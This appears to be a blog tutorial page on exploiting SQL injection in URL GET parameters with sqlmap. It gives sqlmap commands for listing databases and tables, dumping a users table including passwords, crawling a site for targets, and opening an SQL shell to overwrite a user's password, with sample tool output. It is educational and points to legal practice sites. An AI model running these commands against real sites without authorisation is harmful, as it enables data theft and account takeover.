<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f9f9f9;
        }

        header {
            background-color: #5e0f0d;
            color: #b79323;
            text-align: center;
            justify-content: center;
            display: flex;
            padding: 1rem 0;
            width: 100%;
            height: 100px;
            align-items: center;
        }
        

        
        .menu {
            border-top: 2px solid white;
            background-color: #5e0f0d;
            padding: 0.5rem 0;
            text-align: center;
        }

        .menu a {
            color: white;
            text-decoration: none;
            margin: 0 1rem;
        }

        .menu a:hover {
            text-decoration: underline;
        }

       
main {
            padding: 1rem;
        }
        .text-content {
            margin-bottom: 1rem;
        }
        .image-container {
            text-align: center;
            margin: 1rem 0;
        }
        .image-container img {
            max-width: 100%;
            height: auto;
            display: block;
            margin: 0 auto;
        }
        .boxed-text {
    display: inline-block;
    border: 1px solid black;
    background-color: #d3d3d3;
    border-radius: 5px;
    padding: 3px 6px;
    color: black;
    margin-top: 0;
    line-height: 1;
        }

  .table-container {
            width: 100%;
            overflow-x: auto; 
        }
        table {
            width: 100%;
            border-collapse: collapse;
            min-width: 400px; 
            background-color: white; 
        }
        th, td {
            border: 1px solid #999;
            padding: 5px 10px; 
            text-align: left;
            white-space: nowrap; 
        }
        th {
            background-color: #d3c4a1; 
        }
.note-box {
    border: 2px solid red; /* Margine roșie subțire */
    background-color: rgba(255, 0, 0, 0.05); /* Roșu foarte subtil */
    color: red; /* Text roșu */
    padding: 12px 18px; /* Spațiu interior echilibrat */
    display: inline-block; /* Se adaptează la conținut */
    border-radius: 5px; /* Colțuri ușor rotunjite */
    font-family: Arial, sans-serif; /* Font curat */
    font-weight: normal; /* Text obișnuit */
}

a {
  text-decoration: none;
}

    
.code-box {
    background-color: #f4f4f4; /* Fundal gri deschis */
    border: 1px solid #ddd; /* Bordură subțire gri */
    border-radius: 8px; /* Colțuri rotunjite */
    padding: 10px; /* Spațiu interior */
    line-height: 1.2; /* Spațiere între linii */
    display: block; /* Face ca elementul să ocupe întreaga lățime */
    overflow-x: auto; /* Activează scroll-ul orizontal */
    white-space: pre; /* Menține formatul codului */
    max-width: 100%; /* Se asigură că nu depășește lățimea containerului */
    font-size: 17.5px; /* Setează dimensiunea fontului */
    
}

.code-box2 {
    background-color: #2d2d2d !important; /* Fundal gri închis */
    border: 1px solid #ddd; /* Bordură subțire gri */
    border-radius: 8px; /* Colțuri rotunjite */
    padding: 10px; /* Spațiu interior */
    line-height: 1.2; /* Spațiere între linii */
    display: block; /* Face ca elementul să ocupe întreaga lățime */
    overflow-x: auto; /* Activează scroll-ul orizontal */
    white-space: pre; /* Menține formatul codului */
    max-width: 100%; /* Se asigură că nu depășește lățimea containerului */
    font-size: 17.5px; /* Setează dimensiunea fontului */
    color: #d0d0d0;
}

.terminal {
    width: 90%;  
    max-width: 600px;  
    background-color: #2d2d2d !important; /* Asigură că fundalul rămâne negru */
    border: 2px solid white;
    border-radius: 10px;
    padding: 10px;
    overflow-x: auto;
    white-space: nowrap;
    height: auto;
    color: white; /* Setează culoarea textului pentru contrast */
}
.username {  
        color: #66cc66; /* Verde închis pentru numele de utilizator */  
    }  

    .commandt {  
        color: white;  
    }  

        footer {
            background-color: #333;
            color: white; 
            text-align: center;
            padding: 1rem;
            border-top: 2px solid white;

}

  .blue-link {
    color: #cc0000; /* Albastru potrivit pentru fundalul #f9f9f9 */
    text-decoration: none;
  }


    </style>
</head>
<body>
    <header>
        <h2><b>andrewjames395.github.io</b></h2>
    </header>

        <div class="menu">
        <a href="https://andrewjames395.github.io">Home</a>
        <a href="#about">About</a>
        <a href="https://andrewjames395.github.io/support.html">Support</a>
    </div>

    <main>

<h2>GET Parameters sql injection with sqlmap</h2>

<div class="image-container"><img src="https://sqlmap.org/images/screenshot.png" alt="sqlmap"></div>
<br>
<p>In the previous article, we learned the basic concepts of SQL Injection and performed this type of attack on a login field. You learn that this type of vulnerability is based on modifying the input fields to manipulate de sql query. However, on a website, a database interogation does not exists only in a such field. <br><br>

You have probably seen, while browsing the web, links that have the following form:<br>

<div class="code-box">https://mywebsite.com/documents.php?id=1<br>
https://gogoshop.com/products.php?cat=fruits<br>
https://myphotos.uk/photos.php?year=2018&month=may</div>

<br>

These types of URLs contain GET parameters. For a better understanding, let's analyze the first link:<br><br>

<div class="code-box">https://mywebsite.com/documents.php?id=1</div>

<br>

A link with a GET parameter is characterized by a question mark, followed by the GET parameter (in our case, id), an equal sign, and the value (in this case, 1). Practically speaking, links with GET parameters send a request to the database to retrieve and display stored content on the page. In our example, the corresponding SQL query would look something like this:<br><br>

<div class="code-box">SELECT * FROM documents WHERE id = 1</div><br>

To test if our page is vulnerable to SQL Injection, we append an apostrophe to the end of the URL:<br><br>

<div class="code-box">https://mywebsite.com/documents.php?id=1'</div><br>

If executing this link returns an error message like "You have an error in your SQL syntax", the site is most likely vulnerable. However, even if the page loads normally, that does not necessarily mean the site is secure, so we will continue testing further. To exploit this type of vulnerability (GET parameter SQL Injection), we will use a special tool called sqlmap. Sqlmap is one of the most powerful and widely used hacking tools, specifically focused on SQL Injection. </p><br>

<b>Installing sqlmap</b><br>

<p>In your Linux terminal, if you haven't already, update your system using the following command: "sudo apt update && sudo apt upgrade". Then, install sqlmap by running: "sudo apt install sqlmap". Once the installation is complete, type "sqlmap" in the terminal. If the application's welcome screen appears, displaying its logo and usage instructions, it means everything was installed successfully. <br><br>
</p><br>

<b>Using sqlmap </b><br>

<p><div class="note-box">Note: Hacking a server or website without the owner's consent is illegal. Hacking techniques can only be used legally in environments specifically designed for testing such skills, on your own devices, or in a setting where you have the owner's permission. Also, all of the informations presented here are publicly available on many cybersecurity websites on internet. </div><br><br>

Sqlmap is used with the following structure: "sqlmap <i>link_with_parameter</i>"

So, in our case, the command will be:<br><br>

<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 -dbs</div><br><br>

We added the -dbs option so that the program not only tests for vulnerabilities but also displays, in case the site is vulnerable to SQL Injection, the names of the databases. Once this command is entered, sqlmap will begin testing different combinations (payloads). If it discovers that the site is vulnerable, it will inform us of this.<br><br>

<div class="code-box2">[11:08:00] [INFO] testing connection to the target URL
[11:08:01] [INFO] testing if the target URL content is stable
[11:08:01] [INFO] target URL content is stable
[11:08:01] [INFO] testing if GET parameter 'id' is dynamic
[11:08:01] [INFO] GET parameter 'id' appears to be dynamic
[11:08:02] [WARNING] heuristic (basic) test shows that GET parameter 'file' might not be injectable
[11:08:02] [INFO] testing for SQL injection on GET parameter 'id'
[11:08:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:08:05] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[11:08:05] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[11:08:07] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[11:08:08] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[11:08:09] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[11:08:11] [INFO] testing 'Generic inline queries'
[11:08:11] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[11:08:12] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[11:08:13] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[11:08:14] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]</div><br>

In the end, it will display the names of the databases, showing them with a [*] in front.<br><br>

...<br><br>

Databases such as information_schema, performance_schema, and mysql are default system databases. The main database usually has a name similar to that of the website, so in our case the good one is "mywebsite_db". Now that we have the database name, we need to extract the table names from it. To do this, we will enter the database name using the -D attribute and use the -tables option.<br><br>

<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 -D mywebsite_db -tables</div><br><br>


After running this command, we will receive an output similar to:<br><br>

...<br><br>

To extract the content of a specific table, we will enter the database with -D and the table name using the -T attribute and use the "-dump" option.<br><br>

<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 -D mywebsite_db -T users -dump</div><br><br>

Now we have the content of the users table. If we want, we can go further and extract only a specific column or certain columns from the table using the "-columns" option, and then, after we have it, entering them with -C option and retrive it with -dump.<br><br>

<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 -D mywebsite_db -T users -columns</div><br>

<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 -D mywebsite_db -T users -C username,password,country -dump</div><br>

This is, in general, the database content extraction with sqlmap. However,with this tool, we can do much more. We can scan a specific website to find links with GET parameters, using the --crawl=2 option. This way, sqlmap will search for all links with GET parameters on that website and test them.<br><br>


<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/ --crawl=2</div><br>

It will also ask you if you want to save, in a temporary file, the links for a further testing. In this case, if you want this, you can test the links from a file with -m option:<br><br>

<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap -m links.txt</div><br>

Also, with sqlmap, we can not only extract tables content but also execute database commands, if the website is vulnerable to SQL Injection. To do this, we use the --sql-shell option. Thus, we can now execute SQL commands without worrying about the correct syntax, which varies depending on how the query is structured, as sqlmap will handle this automatically. We can add new users, modify existing user data, or run any other SQL command we want, depending on the database permissions. At this point, a basic understanding of SQL would be necessary.<br>

<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 --sql-shell
sql-shell> UPDATE users SET password = 'newpassword123' WHERE id = 1; --this command will modify the password of the first user in the table</div><br><br></p>

<b>Recap</b><br>

<p>Sqlmap is used with the structure: sqlmap <i>link_with_parameter</i>. However, if our link has multiple parameters, the command should be structured like this: sqlmap --url="<i>link_with_parameter"</i>. <br><br>

We use the -dbs option to retrieve the database names. Once we have these names, we specify the database name with the -D option, followed by -tables to list the tables. 

<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap <i>link</i> -D <i>dbname</i> -tables</div><br><br>

After obtaining both the database and table names, we use the -D and -T options together and extract the content with -dump.<br><br>


<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap <i>link</i> -D <i>dbname</i> -T <i>tblname</i> -dump</div><br><br>


It is important to note that just because a link follows the format we discussed in this article, it does not automatically mean it is vulnerable to SQL Injection. It simply indicates that it queries a database. </p><br>

<b>Can this vulnerability be exploited directly from the link, without sqlmap?</b><br>

<p>Yes, but it is more complicated and requires a fairly good understanding of the SQL language. With sqlmap, we automate the testing process and make it much simpler.</p><br>


<b>Where can I practice this attack legally?</b><br>

<p>Besides major platforms like Hack The Box, Hack This Site, or Parrot CTF, there are certain websites where this vulnerability can be legally exploited. <br><br>

One of them is <a href="http://testphp.vulnweb.com/"><span class="blue-link">testphp.vulnweb.com</span></a>, a site created by the cybersecurity platform Acunetix, which is intentionally designed with multiple vulnerabilities. By exploring the site, you will find several links with GET parameters, some of which are vulnerable to SQL Injection.<br><br>

Additionally, the first level of <a href="http://redtiger.labs.overthewire.org/level1.php"><span class ="blue-link">RedTigerLabs</span></a> contains such a vulnerability. You need to find the link with a GET parameter, as that one is vulnerable to SQL Injection.</p><br>











</main>
</html>